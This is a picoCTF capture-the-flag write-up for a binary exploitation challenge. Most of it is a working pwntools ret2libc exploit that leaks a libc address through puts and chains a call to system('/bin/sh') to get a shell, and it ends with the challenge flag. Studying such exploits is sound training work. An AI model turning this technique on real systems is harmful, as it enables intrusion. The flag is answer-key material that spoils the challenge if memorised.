# PicoCTF – Here's a LIBC

* **Category:** Binary Exploitation
* **Points:** 90

## Challenge

> I am once again asking for you to pwn this binary vuln libc.so.6 Makefile `nc mercury.picoctf.net 62289`

## Solution
#### ret2libc:
```python
from pwn import * 
elf = context.binary = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc.so.6')
p = remote('mercury.picoctf.net', 62289)#process()

offset = 136
p.recvline()
payload = flat(
        offset * b'A',
        0x400913, # pop rdi; ret;
        elf.got['puts'],
        elf.plt['puts'],
        elf.sym['main']
)
p.sendline(payload)
p.recvline()
leak = u64(p.recv(6) + b'\x00\x00')
log.info(f"LEAK: {hex(leak)}")

libc.address = leak - libc.sym['puts']
log.info(f"BASE: {hex(libc.address)}")

payload = flat(
        offset * b'A',
        0x400913, # pop rdi; ret;
        next(libc.search(b'/bin/sh\x00')),
        0x40052e, # ret;
        libc.sym['system']
)
p.sendline(payload)
p.interactive()

```
```
Flag: picoCTF{1_<3_sm4sh_st4cking_  8652b55904cb7c}
```
